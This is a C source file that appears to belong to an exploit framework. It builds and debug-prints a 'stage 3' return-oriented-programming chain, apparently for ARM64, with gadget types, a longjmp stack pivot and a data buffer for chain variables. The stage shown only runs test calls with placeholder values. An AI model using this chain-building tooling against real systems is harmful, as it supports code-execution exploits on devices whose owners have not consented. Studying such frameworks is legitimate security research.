#include "common.h"
#include "rop.h"


uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
	while (ropvars != NULL) {
		if (!strcmp(name,ropvars->name)) {
			return ropvars->stage_addr;
		}
		ropvars = ropvars->next;
	}
	printf("Stage 3 ROP VAR %s not found\n",name);
	exit(-1);
}
void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
	rop_gadget_t * next = offsets->stage3_ropchain;	
	uint64_t buf;
	int offset_delta = 0;
	while (next != NULL) {
		switch (next->type) {
			case CODEADDR:
				// value doesn't need to be slid anymore
				buf = next->value;
				write(fd,&buf,8);
				break;
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage3_base + offset_delta;
				write(fd,&buf,8);
				break;
			case STATIC:
				buf = next->value;
				write(fd,&buf,8);
				break;
			case BUF:
				write(fd,(void*)next->value,next->second_val);
				offset_delta += next->second_val;
				break;
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				write(fd,&buf,8);
				break;
			default:
				buf = 0;
				write(fd,&buf,8);
		}
		next = next->next;
	}
}
char * pos_description_DBG(int pos, int longjmp_buf) {
	char * buf = malloc(100);
	memset(buf,0,100);
	if (longjmp_buf) {
		if (pos == 13) {
			snprintf(buf,100,"stack pivots here");
		}
		return buf;
	} 
	if (pos >= 5 && pos <= 13) {
		int arg = pos-4;
		if (arg == 6) {arg = 7;}
		else if (arg == 7) {arg = 6;}
		snprintf(buf,100,"ARG %d",arg);
	}
	return buf;
} 
void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
	rop_gadget_t * next = offsets->stage3_ropchain;	
	uint64_t current_addr = offsets->stage3_base;
	uint64_t buf;
	int offset_delta = 0;
	int longjmp_buf = 1;
	int pos = 0;
	char * pos_buf = NULL;
	printf("STAGE 3 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm\n",offsets->stage3_base);
	while (next != NULL) {
		switch (next->type) {
			case CODEADDR:
				// value doesn't need to be slid anymore
				buf = next->value;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (code address) ",buf);
				if (buf == offsets->BEAST_GADGET) {
					printf("Beast gadget (x30)\n");
					printf("=\n");
					pos = 0;
				}else if (buf == offsets->BEAST_GADGET_LOADER) {
					printf("Beast gadget loader (x30)\n");
				}else if (buf == offsets->str_x0_gadget) {
					printf("return val (x0) storing gadget (ARG 8) is the address where we will store to\n");
				}else if (buf == offsets->memcpy) {
					printf("memcpy\n");
				}else{
					printf("normal call if you want to know what this is you have to check your offset struct\n");
				}
				current_addr += 8;
				break;
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage3_base+ offset_delta;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case STATIC:
				buf = next->value;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (static) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case BUF:
				offset_delta += next->second_val;
				current_addr += next->second_val;
				printf("BUFFER INSERTED HERE size: 0x%x spans to 0x%llx\n",next->second_val,current_addr);
				longjmp_buf = 0;
				pos = 0;
				break;
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (variable) (%s realaddr: %llx) %s\n",buf,(char*)next->value,buf-next->second_val,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			default:
				buf = 0;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (NOP)\n",buf);
				pos++;
				current_addr += 8;
				break;
		}
		if (next->comment != NULL) {
			printf("COMMENT: ");
			puts(next->comment);
		}
		next = next->next;
	}
	printf("===\n");
}
void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
	void * buf_pointer = offsets->stage3_databuffer;
	uint64_t buf_in_stage = offsets->stage3_base;
	uint32_t buffer_size = 0;
	buf_pointer += 22*8; // jump over the longjmp we have at the start of the buffer
	buf_in_stage += 22*8;
	rop_var_t * current_var = ropvars;
	while (current_var != NULL) {
		buffer_size += current_var->size;
		if (buffer_size > offsets->stage3_databuffer_len) {
			printf("STAGE 3, DATABUFFER TO SMALL\n");
			exit(-1);
		}
		// copy the variable into the buffer
		memcpy(buf_pointer,current_var->buffer,current_var->size);
		current_var->stage_addr = buf_in_stage;
		buf_pointer += current_var->size;
		buf_in_stage += current_var->size;
		current_var = current_var->next;
	}
}
void stage3(offset_struct_t * offsets,char * base_dir) {


	offsets->stage3_databuffer_len = 0x1000;
	offsets->stage3_databuffer = malloc(offsets->stage3_databuffer_len);

	// let's go
	INIT_FRAMEWORK(offsets);
	
	CALL_FUNC(0x0,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	CALL_FUNC_WITH_RET_SAVE(0x0,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	uint64_t * test = malloc(sizeof(uint64_t));
	*test = 10;
	DEFINE_ROP_VAR("test",8,test);
	SET_ROP_VAR64("test",14);
	DEFINE_ROP_VAR("test2",8,test);
	ROP_VAR_CPY("test","test2",8);
	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	ADD_COMMENT("var/arg test");
	ROP_VAR_ARG("test",1);
	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	if (curr_rop_var != NULL) {
		build_databuffer(offsets,rop_var_top);
	}
	build_chain_DBG(offsets,rop_var_top);
		
}
